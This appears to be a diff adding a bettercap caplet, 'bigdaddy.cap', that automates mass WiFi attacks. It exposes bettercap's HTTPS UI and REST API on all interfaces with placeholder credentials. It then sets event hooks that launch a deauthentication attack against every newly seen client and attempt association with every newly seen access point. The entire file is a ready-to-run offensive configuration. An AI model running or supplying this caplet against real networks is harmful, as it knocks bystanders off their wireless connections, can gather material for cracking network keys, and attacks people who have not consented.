@@ -1,0 +1,38 @@
+# bigdaddy.cap
+# caplet for bettercap that enables the https-ui as well as a combination mass association and mass deauthentication attack
+# whenever a new WiFi client station is discovered launch a deauth attack
+# whenever a new WiFi access point is discovered attempt to associate with it
+
+
+# setup https ui
+# api listening on https://0.0.0.0:8083/ and ui on https://0.0.0.0
+set api.rest.address 0.0.0.0
+set api.rest.port 8083
+set https.server.address 0.0.0.0
+set https.server.port 443
+
+# make sure both use the same https certificate so api requests won't fail
+set https.server.certificate ~/.bettercap-https.cert.pem
+set https.server.key ~/.bettercap-https.key.pem
+set api.rest.certificate ~/.bettercap-https.cert.pem
+set api.rest.key ~/.bettercap-https.key.pem
+# default installation path of the ui
+set https.server.path /usr/local/share/bettercap/ui
+
+# !!! CHANGE THESE !!!
+set api.rest.username user
+set api.rest.password pass
+
+# ignore custom networks
+set wifi.deauth.skip <bssid-comma-separated-list>
+set wifi.assoc.skip <bssid-comma-separated-list>
+
+# whenever a new client is discovered launch a deauth attack
+events.on wifi.client.new wifi.deauth {{Client/mac}}
+# whenever a new WiFi access point is discovered try to associate with it
+events.on wifi.ap.new wifi.assoc {{mac}}
+
+wifi.recon on
+api.rest on
+https.server on
+
